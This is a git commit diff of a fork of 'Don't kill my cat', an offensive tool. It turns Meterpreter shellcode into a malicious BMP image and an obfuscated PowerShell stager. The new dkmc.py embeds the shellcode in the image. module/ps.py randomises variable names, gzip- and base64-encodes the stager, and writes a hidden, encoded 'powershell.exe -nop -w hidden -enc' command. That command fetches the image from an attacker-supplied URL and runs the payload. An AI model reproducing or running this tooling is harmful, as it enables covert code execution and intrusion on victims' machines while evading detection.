92da18457764b3a6cdbfc76eeb4b254da7b0c105
Lynkle <lynkle@lynkle.xyz>
2020-02-03 05:49:05 +0000

    Initial commit of forked project.

--- dkmc.py
+++ dkmc.py
@@ -1,49 +1,29 @@
+#!/usr/bin/env python2
 import os
-from core.ui import UI
-from core.menu import MenuUI
-from module.gen import GenModule
-from module.web import WebModule
-from module.ps import PsModule
-from module.shellcode import ShellcodeModule
+import re
+import argparse as ap
+import module.gen
+import module.ps
+
+def get_raw_shellcode(shellcode_path):
+    shellcode = ""
+    if os.path.exists(shellcode_path):
+        shellcode =  "\\x" + "\\x".join(re.findall("..", open(shellcode_path, "rb").read().encode("hex")))
+    else:
+        print "%s not found" % shellcode_path
+    return shellcode
 
 if __name__ == "__main__":
+    parser = ap.ArgumentParser(description='Don\'t kill my cat - one liner version.')
+    parser.add_argument('-s', '--shellcode', required=True, help="The path to the raw shellcode file from Meterpreter")
+    parser.add_argument('-o', '--output', required=False, default="out.bmp", help="The name for the outputted bitmap image")
+    parser.add_argument('-p', '--powershell', required=False, default="exploit.ps", help="The name for the outputted powershell file")
+    parser.add_argument('-u', '--url', required=True, help="The URL that powershell will attempt to access the malicious .bmp from.")
+    parser.add_argument('-i', '--image', required=False, default="sample/default.bmp", help="The path to the .bmp that you wish to embed the shellcode in.")
 
-    if not os.path.exists("output/"):
-	os.makedirs("output/")
-
-    options = []
-    options.append(("gen", "Generate a malicious BMP image"))
-    options.append(("web", "Start a web server and deliver malicious image"))
-    options.append(("ps", "Generate Powershell payload"))
-    options.append(("sc", "Generate shellcode from raw file"))
-    options.append(("exit", "Quit the application"))
+    args = parser.parse_args()
+    shellcode = get_raw_shellcode(args.shellcode)
+    if shellcode != "":
+        if module.gen.generate_shellcode(shellcode, args.output, args.image):
+            module.ps.generate_powershell(args.powershell, args.url)
     
-    exit_loop = False
-    error = ""
-    ui = UI()
-    menu = MenuUI()
-    
-    while not exit_loop:
-	try:
-	        ui.banner()
-        	choice = ui.show_menu(options, error)
-	        error = ""
-        	if menu.is_an_option(choice):
-	            mod = None
-        	    if choice == "exit":
-                	exit(0)
-	            if choice == "gen":
-        	        mod = GenModule(ui)
-	            if choice == "web":
-        	        mod = WebModule(ui)
-	            if choice == "ps":
-        	        mod = PsModule(ui)
-	            if choice == "sc":
-        	        mod = ShellcodeModule(ui)
-                    mod.show_menu()
-        	else:
-            		error = "%s is not a valid option" % choice
-	except KeyboardInterrupt:
-		print ""
-		ui.print_error("Exiting")
-		exit(0)
--- module/ps.py
+++ module/ps.py
@@ -1,4 +1,3 @@
-from module import ModuleObject
 import base64
 import os
 import time
@@ -7,63 +6,51 @@ import tempfile
 import random
 import string
 
-class PsModule(ModuleObject):
+def generate_powershell(powershell, url):
+    stage1 = ""
+    stage1 = load_file("core/util/exec-sc-rand.ps1").replace("[URL]", url)
+    for i in reversed(range(1, 12)):
+        stage1 = stage1.replace("var" + str(i), gen_str(random.randrange(3, 10)))
+        
+    path = write_file(stage1)
+    stage1 = read_file(path).replace("A", "!")
+    delete_file(path)
+    stage2 = load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
+    for i in range(1,3):
+        stage2 = stage2.replace("VAR" + str(i), gen_str(random.randrange(3, 10)))
     
-    def __init__(self, ui):
-        ModuleObject.__init__(self)
-        self.ui = ui
-        self.vars = {}
-        self.vars["url"] = ["", "Url that point to the malicious image"]
-        self.vars["rand"] = ["true", "Use random variables name"]
-        self.description = "Module to generate Powershell payload"
-        self.module_name = "powershell"
-        
-    def run_action(self):
-        stage1 = ""
-        if self.vars["rand"][0].lower() == "true" or True:
-            stage1 = self.load_file("core/util/exec-sc-rand.ps1").replace("[URL]", self.vars["url"][0])
-            for i in reversed(range(1, 12)):
-                stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(3, 10)))
-			
-        path = self.write_file(stage1)
-        stage1 = self.read_file(path).replace("A", "!")
-        self.delete_file(path)
-        stage2 = self.load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
-	for i in range(1,3):
-		stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
-		
-        self.ui.print_msg("Powershell script:")
-        print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
-        
-    def gen_str(self, size):
-        return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
-		
-    def load_file(self, path):
-        path = os.getcwd() + "/" + path
-        if os.path.exists(path):
-            return open(path, "rb").read()
-        else:
-            self.ui.print_error("%s not found" % path)
-            return False
-        
-    def convert_to_unicode(self, data, do_base64 = True):
-        unicode_string = ""
-        for char in data:
-            unicode_string += char + "\x00"
-        
-        if do_base64:
-            return base64.b64encode(unicode_string)
-        return unicode_string
+    data = "powershell.exe -nop -w hidden -enc %s" % convert_to_unicode(stage2)
+    open(powershell, "wb").write(data)
+    print "Powershell output has been saved. (%s/%s)" %  (os.getcwd(), powershell)
     
-    def write_file(self, data):
-        path = tempfile.gettempdir() + "/" + str(time.time())
-        fd = gzip.open(path, "wb")
-        fd.write(data)
-        fd.close()
-        return path
-        
-    def delete_file(self, path):
-        os.unlink(path)
-        
-    def read_file(self, path):
-	return base64.b64encode(open(path, "rb").read())
+def gen_str(size):
+    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
+    
+def load_file(path):
+    path = os.getcwd() + "/" + path
+    if os.path.exists(path):
+        return open(path, "rb").read()
+    else:
+        return False
+    
+def convert_to_unicode(data, do_base64 = True):
+    unicode_string = ""
+    for char in data:
+        unicode_string += char + "\x00"
+    
+    if do_base64:
+        return base64.b64encode(unicode_string)
+    return unicode_string
+
+def write_file(data):
+    path = tempfile.gettempdir() + "/" + str(time.time())
+    fd = gzip.open(path, "wb")
+    fd.write(data)
+    fd.close()
+    return path
+    
+def delete_file(path):
+    os.unlink(path)
+    
+def read_file(path):
+    return base64.b64encode(open(path, "rb").read())
